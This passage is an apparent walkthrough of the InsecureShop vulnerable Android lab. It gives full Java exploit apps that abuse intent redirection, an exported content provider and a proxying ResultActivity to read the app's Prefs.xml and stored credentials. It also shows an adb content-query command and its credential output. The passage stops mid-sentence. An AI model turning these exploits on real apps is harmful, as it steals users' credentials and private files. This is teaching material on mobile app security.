    <span class="n">setTitle</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="no">C0893R</span><span class="o">.</span><span class="na">string</span><span class="o">.</span><span class="na">webview</span><span class="o">));</span>
    <span class="nc">Intent</span> <span class="n">extraIntent</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Intent</span><span class="o">)</span> <span class="n">getIntent</span><span class="o">().</span><span class="na">getParcelableExtra</span><span class="o">(</span><span class="s">"extra_intent"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">extraIntent</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">startActivity</span><span class="o">(</span><span class="n">extraIntent</span><span class="o">);</span>
        <span class="n">finish</span><span class="o">();</span>
        <span class="k">return</span><span class="o">;</span>
<span class="o">}</span> 
</pre></table></code></div></div><p>So we only need to pass the protected component along with the <code class="language-plaintext highlighter-rouge">extra_intent</code> parameter. Let’s craft our exploit app:</p><p><strong><code class="language-plaintext highlighter-rouge">MainActivity.java</code></strong></p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>

<span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>

    <span class="c1">// Once the WebView2Activity Start it will start for us the Activity2 from my app</span>
    <span class="c1">// then access the content provider and get the content of the Prefs.xml file and add it to the Intent data</span>
    <span class="c1">// finally in the Activity2 we will get the Intent Data and Log it</span>
    <span class="nc">Intent</span> <span class="nc">FileProviderIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
    <span class="nc">FileProviderIntent</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="nc">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span><span class="o">);</span>
    <span class="nc">FileProviderIntent</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="n">getPackageName</span><span class="o">(),</span> <span class="s">"com.insecureshopapp.protectedinsecureprovider.Activity2"</span><span class="o">);</span>
    <span class="nc">FileProviderIntent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml"</span><span class="o">));</span>

    <span class="c1">// Start the Vulnerable Actvity</span>
    <span class="nc">Intent</span> <span class="nc">WebView2Activity</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
    <span class="nc">WebView2Activity</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.insecureshop"</span><span class="o">,</span> <span class="s">"com.insecureshop.WebView2Activity"</span><span class="o">);</span>
    <span class="nc">WebView2Activity</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"extra_intent"</span><span class="o">,</span> <span class="nc">FileProviderIntent</span><span class="o">);</span>

    <span class="n">startActivity</span><span class="o">(</span><span class="nc">WebView2Activity</span><span class="o">);</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p><strong><code class="language-plaintext highlighter-rouge">Activity2.java</code></strong></p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Activity2</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>
<span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_2</span><span class="o">);</span>

    <span class="k">try</span> <span class="o">{</span>
        <span class="c1">// Get the InputStream from the content URI provided by the Intent</span>
        <span class="nc">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">getIntent</span><span class="o">().</span><span class="na">getData</span><span class="o">());</span>

        <span class="c1">// Convert InputStream to String and log it</span>
        <span class="nc">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">inputStream</span><span class="o">));</span>
        <span class="nc">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
        <span class="nc">String</span> <span class="n">line</span><span class="o">;</span>
        <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">stringBuilder</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"\n"</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">reader</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="c1">// Log the content of the file</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"FileContent"</span><span class="o">,</span> <span class="n">stringBuilder</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>

    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">FileNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">"FileContent"</span><span class="o">,</span> <span class="s">"File not found: "</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Log</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="s">"FileContent"</span><span class="o">,</span> <span class="s">"Error reading file: "</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="na">getMessage</span><span class="o">());</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Let’s break down our code:</p><ul><li>The <code class="language-plaintext highlighter-rouge">MainActivity</code> of my exploit app will start, and then it will directly start the vulnerable activity <code class="language-plaintext highlighter-rouge">WebView2Activity</code> as an Intent along with the <code class="language-plaintext highlighter-rouge">extra_intent</code> parameter.<li>The <code class="language-plaintext highlighter-rouge">FLAG_GRANT_READ_URI_PERMISSION</code> flag in an <code class="language-plaintext highlighter-rouge">Intent</code> allows a receiving application to temporarily gain read access to the content URI being shared with it.<li>Next, the <code class="language-plaintext highlighter-rouge">WebView2Activity</code> will start my <code class="language-plaintext highlighter-rouge">Activity2</code> , <em>don’t forget to make it exported</em>, and also will access the <code class="language-plaintext highlighter-rouge">file_provider</code> and get the <code class="language-plaintext highlighter-rouge">Prefs.xml</code> file and save it in the intent data.<li>Finally, my <code class="language-plaintext highlighter-rouge">Activity2</code> will get the intent data, parse it and read it line by line, then log the output of the file.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/InsecureShop/image%2015.png" alt="image.png" /></p><h2 id="insecure-content-provider"><strong>Insecure Content Provider</strong></h2><blockquote><p><strong>Description:</strong> The content provider can be accessed by any third-party app to steal user credentials.</p></blockquote><p>We previously identified two providers, and we managed to exploit one of them. The second provider is already exported, which means that any app could use it:</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nt">&lt;provider</span> 
<span class="na">android:name=</span><span class="s">"com.insecureshop.contentProvider.InsecureShopProvider"</span> 
<span class="na">android:readPermission=</span><span class="s">"com.insecureshop.permission.READ"</span> 
<span class="na">android:exported=</span><span class="s">"true"</span> 
<span class="na">android:authorities=</span><span class="s">"com.insecureshop.provider"</span><span class="nt">/&gt;</span>
</pre></table></code></div></div><p>Let’s take a look at the provider class to see what we can get from it.</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">final</span> <span class="kd">class</span> <span class="nc">InsecureShopProvider</span> <span class="kd">extends</span> <span class="nc">ContentProvider</span> <span class="o">{</span>
<span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">Companion</span> <span class="nc">Companion</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Companion</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
<span class="kd">public</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="no">URI_CODE</span> <span class="o">=</span> <span class="mi">100</span><span class="o">;</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="nc">UriMatcher</span> <span class="n">uriMatcher</span><span class="o">;</span>

<span class="nd">@Override</span> <span class="c1">// android.content.ContentProvider</span>
<span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">onCreate</span><span class="o">()</span> <span class="o">{</span>
    <span class="nc">UriMatcher</span> <span class="n">uriMatcher2</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">UriMatcher</span><span class="o">(-</span><span class="mi">1</span><span class="o">);</span>
    <span class="n">uriMatcher</span> <span class="o">=</span> <span class="n">uriMatcher2</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">uriMatcher2</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="n">uriMatcher2</span><span class="o">.</span><span class="na">addURI</span><span class="o">(</span><span class="s">"com.insecureshop.provider"</span><span class="o">,</span> <span class="s">"insecure"</span><span class="o">,</span> <span class="mi">100</span><span class="o">);</span>
    <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="nc">Cursor</span> <span class="nf">query</span><span class="o">(</span><span class="nc">Uri</span> <span class="n">uri</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">projection</span><span class="o">,</span> <span class="nc">String</span> <span class="n">selection</span><span class="o">,</span> <span class="nc">String</span><span class="o">[]</span> <span class="n">selectionArgs</span><span class="o">,</span> <span class="nc">String</span> <span class="n">sortOrder</span><span class="o">)</span> <span class="o">{</span>
    <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">checkParameterIsNotNull</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="s">"uri"</span><span class="o">);</span>
    <span class="nc">UriMatcher</span> <span class="n">uriMatcher2</span> <span class="o">=</span> <span class="n">uriMatcher</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">uriMatcher2</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">uriMatcher2</span><span class="o">.</span><span class="na">match</span><span class="o">(</span><span class="n">uri</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">100</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="nc">MatrixCursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">MatrixCursor</span><span class="o">(</span><span class="k">new</span> <span class="nc">String</span><span class="o">[]{</span><span class="s">"username"</span><span class="o">,</span> <span class="s">"password"</span><span class="o">});</span>
    <span class="nc">String</span><span class="o">[]</span> <span class="n">strArr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[</span><span class="mi">2</span><span class="o">];</span>
    <span class="nc">String</span> <span class="n">username</span> <span class="o">=</span> <span class="nc">Prefs</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">getUsername</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">username</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">throwNpe</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="n">strArr</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">username</span><span class="o">;</span>
    <span class="nc">String</span> <span class="n">password</span> <span class="o">=</span> <span class="nc">Prefs</span><span class="o">.</span><span class="na">INSTANCE</span><span class="o">.</span><span class="na">getPassword</span><span class="o">();</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">password</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">Intrinsics</span><span class="o">.</span><span class="na">throwNpe</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="n">strArr</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span> <span class="o">=</span> <span class="n">password</span><span class="o">;</span>
    <span class="n">cursor</span><span class="o">.</span><span class="na">addRow</span><span class="o">(</span><span class="n">strArr</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">cursor</span><span class="o">;</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>The code here is doing two things:</p><ul><li>Creating an object from the <code class="language-plaintext highlighter-rouge">UriMatcher</code> class, which is a handy class when you are writing a Content Provider or some other class that needs to respond to a number of different URIs, that matches for this URI  <code class="language-plaintext highlighter-rouge">com.insecureshop.provider/insecure</code>.<li>Then, Using Cursor to query, update, delete the username and password from the <code class="language-plaintext highlighter-rouge">shared_prefs</code> i.e. <code class="language-plaintext highlighter-rouge">Prefs.xml</code> file.</ul><p>So we can simply now access this content provider via the AM Commands utility.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># android:authorities -- com.insecureshop.provider</span><span class="w">
</span><span class="c"># URI matcher -- insecure</span><span class="w">
</span><span class="c"># Read Permessions allowed -- com.insecureshop.permission.READ </span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Muhammad</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">adb</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">content</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nt">--uri</span><span class="w"> </span><span class="nx">content://com.insecureshop.provider/insecure</span><span class="w">
</span><span class="n">Row:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">username</span><span class="o">=</span><span class="n">shopuser</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="o">=!</span><span class="n">ns3csh0p</span><span class="w">
</span></pre></table></code></div></div><h2 id="insecure-implementation-of-setresult-in-exported-activity"><strong>Insecure Implementation of SetResult in exported Activity</strong></h2><blockquote><p><strong>Description:</strong> The insecure implementation used in <code class="language-plaintext highlighter-rouge">ResultActivity</code> can be used to access arbitrary content providers.</p></blockquote><p>Let’s review the <code class="language-plaintext highlighter-rouge">ResultActivity</code> code. First, note that this activity is an exported one.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">&lt;activity</span> <span class="na">android:name=</span><span class="s">"com.insecureshop.ResultActivity"</span> <span class="na">android:exported=</span><span class="s">"true"</span><span class="nt">/&gt;</span> 
</pre></table></code></div></div><p>Moving to its actual code:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setResult</span><span class="o">(-</span><span class="mi">1</span><span class="o">,</span> <span class="n">getIntent</span><span class="o">());</span>
    <span class="n">finish</span><span class="o">();</span>
<span class="o">}</span>
</pre></table></code></div></div><p>What the heck is <code class="language-plaintext highlighter-rouge">setResult()</code>?? I will ask ChatGPT because I didn’t understand it well from the documentation:</p><p>The <code class="language-plaintext highlighter-rouge">setResult()</code> method in Android is used in an activity to send a result back to the activity that started it. How <code class="language-plaintext highlighter-rouge">setResult()</code> works:</p><ul><li><strong>Start Activity for Result</strong>: The first activity (let’s call it Activity A) starts another activity (Activity B) and expects a result back. Activity A uses <code class="language-plaintext highlighter-rouge">startActivityForResult()</code> to start Activity B.</ul><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c1">// Activity A (First Activity):</span>
<span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="nc">ActivityB</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">startActivityForResult</span><span class="o">(</span><span class="n">intent</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>  <span class="c1">// Request code 1</span>
</pre></table></code></div></div><ul><li><strong>Set the Result in the Second Activity</strong>: In Activity B, you use <code class="language-plaintext highlighter-rouge">setResult()</code> to specify the result that should be returned to Activity A. This result can include data, or it can simply indicate that the action was successful or canceled.<li><strong>Finish the Second Activity</strong>: After calling <code class="language-plaintext highlighter-rouge">setResult()</code>, Activity B usually calls <code class="language-plaintext highlighter-rouge">finish()</code> to close itself and return the result to Activity A.</ul><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_b</span><span class="o">);</span>

    <span class="c1">// Some operation and preparing the result</span>
    <span class="nc">Intent</span> <span class="n">resultIntent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
    <span class="n">resultIntent</span><span class="o">.</span><span class="na">putExtra</span><span class="o">(</span><span class="s">"result_key"</span><span class="o">,</span> <span class="s">"Some Result Data"</span><span class="o">);</span>

    <span class="c1">// Set result as OK and attach the data</span>
    <span class="n">setResult</span><span class="o">(</span><span class="no">RESULT_OK</span><span class="o">,</span> <span class="n">resultIntent</span><span class="o">);</span>

    <span class="c1">// Finish this activity and return the result</span>
    <span class="n">finish</span><span class="o">();</span>
<span class="o">}</span>
</pre></table></code></div></div><ul><li><strong>Handle the Result in the First Activity</strong>: When Activity B finishes, the system calls <code class="language-plaintext highlighter-rouge">onActivityResult()</code> in Activity A, where you can handle the returned result.</ul><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onActivityResult</span><span class="o">(</span><span class="kt">int</span> <span class="n">requestCode</span><span class="o">,</span> <span class="kt">int</span> <span class="n">resultCode</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onActivityResult</span><span class="o">(</span><span class="n">requestCode</span><span class="o">,</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>
    
    <span class="k">if</span> <span class="o">(</span><span class="n">requestCode</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>  <span class="c1">// Matching the request code</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">resultCode</span> <span class="o">==</span> <span class="no">RESULT_OK</span><span class="o">)</span> <span class="o">{</span>  <span class="c1">// Result is OK</span>
            <span class="nc">String</span> <span class="n">result</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">getStringExtra</span><span class="o">(</span><span class="s">"result_key"</span><span class="o">);</span>
            <span class="c1">// Handle the result</span>
        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">resultCode</span> <span class="o">==</span> <span class="no">RESULT_CANCELED</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// Handle cancellation or no result</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>But in our case, we have something different: <code class="language-plaintext highlighter-rouge">setResult(-1, getIntent());</code> the <code class="language-plaintext highlighter-rouge">setResult</code> is just returns itself again, i.e. :</p><ul><li>By passing <code class="language-plaintext highlighter-rouge">getIntent()</code> as the second parameter to <code class="language-plaintext highlighter-rouge">setResult()</code>, you are returning the same <code class="language-plaintext highlighter-rouge">Intent</code> that was used to start the current activity. This <code class="language-plaintext highlighter-rouge">Intent</code> may contain any data that was passed when the activity was launched.</ul><p>So if the <code class="language-plaintext highlighter-rouge">setResult()</code> returns data that was passed when the activity was launched, and we are controlling the launcher activity ( Activity A — Exploit app ). Simply put, we can add any code to interact with InsecureShop, as if we were him, then get the data. For simplicity, any app contains exported and unexported activities. Any app could access other apps’ exported activities, but the unexported activities can only be accessed inside its app, which is simple and easy. But here we have an exported activity that allows us to get the result of any launching activity that we want. It acts as a proxy between the exploit app and the target app.</p><p>We can use this to access the unexported content provider <code class="language-plaintext highlighter-rouge">com.insecureshop.file_provider</code>. Let’s create our exploit app:</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MainActivity</span> <span class="kd">extends</span> <span class="nc">AppCompatActivity</span> <span class="o">{</span>

<span class="nd">@Override</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onCreate</span><span class="o">(</span><span class="nc">Bundle</span> <span class="n">savedInstanceState</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onCreate</span><span class="o">(</span><span class="n">savedInstanceState</span><span class="o">);</span>
    <span class="n">setContentView</span><span class="o">(</span><span class="no">R</span><span class="o">.</span><span class="na">layout</span><span class="o">.</span><span class="na">activity_main</span><span class="o">);</span>
    
    <span class="nc">Intent</span> <span class="nc">ResultActivityExploit</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">();</span>
    <span class="nc">ResultActivityExploit</span><span class="o">.</span><span class="na">setClassName</span><span class="o">(</span><span class="s">"com.insecureshop"</span><span class="o">,</span> <span class="s">"com.insecureshop.ResultActivity"</span><span class="o">);</span>
    <span class="nc">ResultActivityExploit</span><span class="o">.</span><span class="na">setFlags</span><span class="o">(</span><span class="nc">Intent</span><span class="o">.</span><span class="na">FLAG_GRANT_READ_URI_PERMISSION</span><span class="o">);</span>
    <span class="nc">Uri</span> <span class="n">contentUri</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml"</span><span class="o">);</span>
    <span class="nc">ResultActivityExploit</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">contentUri</span><span class="o">);</span>
    <span class="n">startActivityForResult</span><span class="o">(</span><span class="nc">ResultActivityExploit</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
<span class="o">}</span>
<span class="kd">protected</span> <span class="kt">void</span> <span class="nf">onActivityResult</span><span class="o">(</span><span class="kt">int</span> <span class="n">requestCode</span><span class="o">,</span> <span class="kt">int</span> <span class="n">resultCode</span><span class="o">,</span> <span class="nc">Intent</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
    <span class="kd">super</span><span class="o">.</span><span class="na">onActivityResult</span><span class="o">(</span><span class="n">requestCode</span><span class="o">,</span> <span class="n">resultCode</span><span class="o">,</span> <span class="n">data</span><span class="o">);</span>

    <span class="k">if</span> <span class="o">(</span><span class="n">requestCode</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="n">resultCode</span> <span class="o">==</span> <span class="no">RESULT_OK</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// Capture the returned data</span>
        <span class="nc">Uri</span> <span class="n">returnedUri</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">returnedUri</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// Access the content using the returned URI</span>
            <span class="k">try</span> <span class="o">{</span>
                <span class="nc">InputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">().</span><span class="na">openInputStream</span><span class="o">(</span><span class="n">returnedUri</span><span class="o">);</span>
                <span class="c1">// Do something with the input stream, e.g., display or log the content</span>
                <span class="c1">// For example, read the input stream and print to screen</span>
                <span class="nc">BufferedReader</span> <span class="n">reader</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nc">InputStreamReader</span><span class="o">(</span><span class="n">inputStream</span><span class="o">));</span>
                <span class="nc">String</span> <span class="n">line</span><span class="o">;</span>
                <span class="nc">StringBuilder</span> <span class="n">result</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">StringBuilder</span><span class="o">();</span>
                <span class="k">while</span> <span class="o">((</span><span class="n">line</span> <span class="o">=</span> <span class="n">reader</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">result</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">line</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"\n"</span><span class="o">);</span>
                <span class="o">}</span>
                <span class="c1">// Display the content on the screen</span>
                <span class="nc">Log</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="s">"Data"</span><span class="o">,</span> <span class="n">result</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><p>Let’s break it down:</p><ul><li>The <code class="language-plaintext highlighter-rouge">ResultActivityExploit</code> Intent is set to start <code class="language-plaintext highlighter-rouge">ResultActivity</code> in Insecureshop app.<li>The <code class="language-plaintext highlighter-rouge">Intent</code> includes a URI that points to the unexported content provider. And flagged with <code class="language-plaintext highlighter-rouge">FLAG_GRANT_READ_URI_PERMISSION</code> to ensure Insecureshop app has permission to read the content provider’s data.<li>The <code class="language-plaintext highlighter-rouge">ResultActivity</code> is started with <code class="language-plaintext highlighter-rouge">startActivityForResult()</code>, and since it is coded to return the same <code class="language-plaintext highlighter-rouge">Intent</code>, it will invoke <code class="language-plaintext highlighter-rouge">setResult()</code> with the same <code class="language-plaintext highlighter-rouge">Intent</code>.<li>In our exploit app, capture the returned <code class="language-plaintext highlighter-rouge">Intent</code> in the <code class="language-plaintext highlighter-rouge">onActivityResult()</code> method. And log the returned content provider 